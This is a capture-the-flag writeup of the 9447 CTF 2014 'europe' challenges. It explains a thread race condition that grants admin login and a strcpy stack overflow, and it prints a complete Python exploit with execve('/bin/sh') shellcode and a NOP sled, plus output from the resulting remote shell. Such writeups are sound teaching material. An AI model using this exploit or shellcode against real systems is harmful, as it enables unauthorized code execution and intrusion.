---
layout: post
title: "9447 CTF 2014 'europe' writeup"
categories: writeups 9447ctf2014
tags: exploitation
author: saelo
---

During 9447 CTF 2014, [europe]({{ site.url }}/files/9447ctf2014/europe) was a series of 3 exploitation challenges, all using the same binary. Each one would yield a different flag and in total those three flags where worth 700 points (200, 120, 380).

To start let's first check some flags on the binary using [checksec.sh](http://www.trapkit.de/tools/checksec.html):

    > checksec --file europe
    RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH
    No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH

No NX and no PIE, if we can get some code into the .bss and jump there we'll get reliable code execution. Let's keep that in mind.

Running the binary will first result in some segfaults due to missing files. It will need the following files in the cwd: passwd (containing entries of the form "username:hash"), salt (just a string), flag01 and flag02.
Now, running the binary we get

    What would you like to do?
     1. Login
     2. Read the key (admin only)
     3. See the message
     4. Quit
     >

## Reverse Engineering the Binary

After some time reading through the disassembly and running the binary through gdb I ultimately ended up with the following description of the binary's behaviour:

### Main Thread

- Read flag01 and flag02 and store their content on the stack
- Start two new threads
- Go into a loop asking for the user's input and process it

Signalling between the threads is done through condition variables. Data is shared by writing to buffers in the .bss.

Handling of the user input:

**1 (Login)**

- Store username and password into two temporary buffers in the .bss segment (tmp_username_buf at 0x0804a1c0 and passwd_buf at 0x0804b560)
- Wake up the second thread by signalling on the second condvar

**2 (Read the key)**

- Check if the string stored at 0x0804c9a0 in the .bss (in the following named username_buf) is "admin", if yes print flag01

**3 (See the message)**

- Check if the user is authenticated. A user is considered authenticated if the username_buf is not an empty string.
- If the user is not authenticated print "You're not logged in, access to the message is denied." and jump back to the beginning of the loop, otherwise:
- Copy the current username from the username_buf (0x0804c9a0) into a buffer on the stack and xor each byte with 0x20 (for ASCII this changes a character from uppercase to lowercase and vice versa)
- printf("yOU aRE aWESOME, %s!\n", local_buf)

**4 (Quit)**

- Exit the loop and return

Now let's see what the two threads are doing.

###Thread 1:

This thread just calls pthread_cond_signal on the first condvar once per second in an infinite loop.

###Thread 2 (authentication thread):

Setup:

- Read the salt file and parse the entries from the passwd file and store them on the stack. Also stores the number of entries in a local variable (in the disassembly this is basically everything up to 0x08048b81)
- Wait on the second condvar

Once woken up (by the main thread to authenticate a user) it will then perform the following steps:

- Make sure the username (tmp_username_buf) is shorter than 0x20 characters
- Check if the username and password is "guest:guest", if yes set a flag
- Loop through the structure created during setup and try to find the given username in there
- [crypt()](http://linux.die.net/man/3/crypt) the provided password and the salt from the salt file
- Wait on the first condvar (will be woken up within one second by the first thread)
- Compare calculated password with the stored one (if no username match was found then compare with an empty string, always yielding false)
- If they match *or* if the flag from above was set:
    - strcpy(local_buf, tmp_username_buf)
    - strcpy(username_buf, local_buf)

So much for the analysis of the binary.

Now, did you spot a vulnerability somewhere?

## The Vulnerability

There's a race condition between the main thread and thread 2 which can be triggered as follows:

1. Login as guest:guest. The main thread will wake up the second thread which will set the guest_login flag but still do the crypt stuff. It will then wait for the signal from thread 1.
2. Now login as admin:whatever. With some luck by the time the verifier thread wakes up and does the strcpy we've changed the string in tmp_username_buf to "admin".

If everything worked out we will now be logged in as admin and can grab flag01 through the second command. :)

Here's the code to do that (it's using the template from [here](https://github.com/kitctf/ctfcode/tree/master/ExploitTemplates)):

{% highlight python %}
def get_flag01():
    while True:
        with connect(TARGET) as c:
            c.send(b'1\n')
            c.send(b'guest\n')
            c.send(b'guest\n')
            c.send(b'1\n')
            c.send(b'admin\n')
            c.send(b'asdf\n')
            time.sleep(1)
            c.send(b'2\n')
            c.send(b'4\n')
            resp = d(c.recv_until_found([b'Congratulations', b'Access']))
            if '9447' in resp:
                print(re.search('(9447{\w+})', resp).group(1))
                return
            else:
                sys.stdout.write('.')
                sys.stdout.flush()
{% endhighlight %}

Two flags left to go.

## Getting Code Execution

Reading through the above analysis you'll notice there are two strcpy operations which copy data into a buffer on the stack (one at the end of a successful login in the authentication thread and one in the main thread when fetching the message).\\
Both of them are performed without checking the length of the src buffer first, presumably because the data there (the username) should already have been checked to be smaller than 0x20. This assumption is invalid though as we can put a much longer string there once we win the race. (The fgets from stdin allows us to put up to 5000 bytes into the tmp_username_buf while the stack buffer is only 500 bytes large, see the memset(0) block at 0x08048db1)

The overflow in the main thread looks particularly interesting as we can make the main function return and thus gain code execution if we overflow into the return address. (The main function of the second thread never returns)\\
Additionally, flag02 is stored on the stack, so if we overflow just up to the start of it we will be able to leak it through the "See message" functionality (command 3). I went straight for code execution here though, so leaking flag02 this way is left as an exercise for the reader ;)

To sum it up we now have a buffer overflow that we can trigger by winning the race and writing an overly long username. Stack canaries are disabled so this should be relatively easy.\\
It mostly is, however, there's a little catch. Check the disassembly:

    08048fdf C745F400000000         mov        dword [ss:ebp+curr_index], 0x0
    08048fe6 EB27                   jmp        0x804900f

    08048fe8 8B45F4                 mov        eax, dword [ss:ebp+curr_index]
    08048feb 05A0C90408             add        eax, 0x804c9a0              ; username_buf
    08048ff0 0FB600                 movzx      eax, byte [ds:eax]
    08048ff3 0FBEC0                 movsx      eax, al
    08048ff6 890424                 mov        dword [ss:esp], eax
    08048ff9 E8C2FCFFFF             call       xor_20
    08048ffe 8D8D14FAFFFF           lea        ecx, dword [ss:ebp+local_buf]
    08049004 8B55F4                 mov        edx, dword [ss:ebp+curr_index]
    08049007 01CA                   add        edx, ecx
    08049009 8802                   mov        byte [ds:edx], al
    0804900b 8345F401               add        dword [ss:ebp+curr_index], 0x1

    0804900f 8B45F4                 mov        eax, dword [ss:ebp+curr_index]
    08049012 05A0C90408             add        eax, 0x804c9a0              ; username_buf
    08049017 0FB600                 movzx      eax, byte [ds:eax]
    0804901a 84C0                   test       al, al
    0804901c 75CA                   jne        0x8048fe8

Here curr_index is the index into the source and destination buffers and is located at [ebp-0xc]. The destination buffer however starts at [ebp-0x5ec], so we will eventually overwrite the current index value. Now, if we overwrite it with some value smaller than it's current value the loop will go back to a previous index effectively causing an infinite loop.\\
By the time we hit the first byte of curr_index, it's value will be 0x5e1, so the easiest way around this is to just write 0x5e1 at that point. Note that we can write zero bytes here since the bytes will be xored with 0x20 first :)

Putting it all together the exploit will do the following:

1. Start a login as guest:guest
2. Start a second login with *payload*:whatever
3. Trigger the overflow by letting the main thread print us the message
4. Cause the main function to return by quitting the program

*payload* will contain the shellcode to execute, then some padding up to 0x5e0 bytes followed by the value (0x5e1 xor 0x20202020), some more padding up to the return address and finally the encoded return address. The exploit will just return to the username_buf in the .bss (which is executable as we've seen at the beginning).

Here's the output of running the exploit against the ctf server:

    > ./exploit_europe.py
    ...........................Pwned!
    whoami
    ctf
    pwd
    /home/ctf
    cat flag01
    9447{Th1s_wa5nT_loCk3d_d0wn_En0ugH}
    cat flag02
    9447{Th3_gRe4t_1eAK_0f_eUr0p3}
    cat flag03
    9447{c0n6rat5_oN_Conquer1ng_Europ3}

And here is the full exploit code. Enjoy :)

{% highlight python %}
#!/usr/bin/env python
#coding: UTF-8

import re
import sys
import time
import struct
import socket
import select

TARGET = ('europe.9447.plumbing', 9447)

# linux/x86 Shellcode execve ("/bin/sh")
SHELLCODE = (b'\x31\xc9\xf7\xe1\x51\x68\x2f\x2f'
             b'\x73\x68\x68\x2f\x62\x69\x6e\x89'
             b'\xe3\xb0\x0b\xcd\x80')

#
# Helper Functions
#
def e(s):
    return s.encode('UTF-8')

def d(s):
    return s.decode('UTF-8')

def p(d, fmt='<I'):
    return struct.pack(fmt, d)

def u(d, fmt='<I'):
    return struct.unpack(fmt, d)

def u1(d, fmt='<I'):
    return u(d, fmt)[0]

#
# Networking
#

# The default timeout (in seconds) to use for all operations that may raise an exception
DEFAULT_TIMEOUT = 5

class Connection:
    """Connection abstraction built on top of raw sockets."""

    def __init__(self, remote):
        self._socket = socket.create_connection(remote, DEFAULT_TIMEOUT)

        # Disable kernel TCP buffering
        self._socket.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)

    def __enter__(self):
        return self

    def __exit__(self, type, value, traceback):
        self.disconnect()

    def disconnect(self):
        """Shut down and close the socket."""
        self._socket.shutdown(socket.SHUT_RDWR)
        self._socket.close()

    def recv(self, bufsize=4096, timeout=DEFAULT_TIMEOUT, dontraise=False):
        """Receive data from the remote end."""
        self._socket.settimeout(timeout)
        try:
            return self._socket.recv(bufsize)
        except socket.timeout:
            if dontraise:
                return b''
            else:
                raise

    def recv_until_found(self, keywords, timeout=DEFAULT_TIMEOUT):
        """Receive incoming data until one of the provided keywords is found."""
        buf = b''

        while not any(True for kw in keywords if kw in buf):
            buf += self.recv(timeout=timeout)

        return buf

    def recv_until_match(self, regex, timeout=DEFAULT_TIMEOUT):
        """Receive incoming data until it matches the given regex."""
        if isinstance(regex, str):
            regex = re.compile(regex)
        buf = ''
        match = None

        while not match:
            buf += d(self.recv(timeout=timeout))
            match = regex.search(buf)

        return match

    def recvn(self, n, timeout=DEFAULT_TIMEOUT):
        """Receive n lines from the remote end."""
        buf = b''

        while buf.count(b'\n') < n:
            # This maybe isn't great, but it's short and simple...
            buf += self.recv(1, timeout)

        return buf

    def send(self, data):
        """Send all data to the remote end or raise an exception."""
        self._socket.sendall(data)

    def interact(self):
        """Interact with the remote end."""
        try:
            while True:
                print(d(self.recv(timeout=.05, dontraise=True)), end='')
                available, _, _ = select.select([sys.stdin], [], [], .05)
                if available:
                    data = sys.stdin.readline()
                    self.send(e(data))
        except KeyboardInterrupt:
            return


def connect(remote):
    """Factory function."""
    return Connection(remote)



#
# Exploit code
#
def get_flag01():
    while True:
        with connect(TARGET) as c:
            c.send(b'1\n')
            c.send(b'guest\n')
            c.send(b'guest\n')
            c.send(b'1\n')
            c.send(b'admin\n')
            c.send(b'asdf\n')
            time.sleep(1)
            c.send(b'2\n')
            c.send(b'4\n')
            resp = d(c.recv_until_found([b'Congratulations', b'Access denied']))
            if '9447' in resp:
                print(re.search('(9447{\w+})', resp).group(1))
                return
            else:
                sys.stdout.write('.')
                sys.stdout.flush()

def pwn():
    payload  = p(0x90, '<B')*1000             # nopsled
    payload += SHELLCODE                      # shellcode
    payload += b'A' * (0x5e0-len(payload))    # padding
    payload += p(0x5e1 ^ 0x20202020)          # current index
    payload += b'B' * 12                      # padding
    payload += p(0x0804c9a1 ^ 0x20202020)     # return address

    while True:
        with connect(TARGET) as c:
            c.send(b'1\n')
            c.send(b'guest\n')
            c.send(b'guest\n')
            c.send(b'1\n')
            c.send(payload + b'\n')
            c.send(b'asdf\n')
            time.sleep(1)       # make sure the login completed
            c.send(b'3\n')      # trigger the overflow
            c.send(b'4\n')      # ret -> gain code execution
            resp = c.recv_until_found([b'yOU aRE aWESOME', b'You\'re not logged in'])
            if b'yOU aRE aWESOME' in resp:
                print("Pwned!")
                c.interact()
                return
            else:
                sys.stdout.write('.')
                sys.stdout.flush()


pwn()
{% endhighlight %}
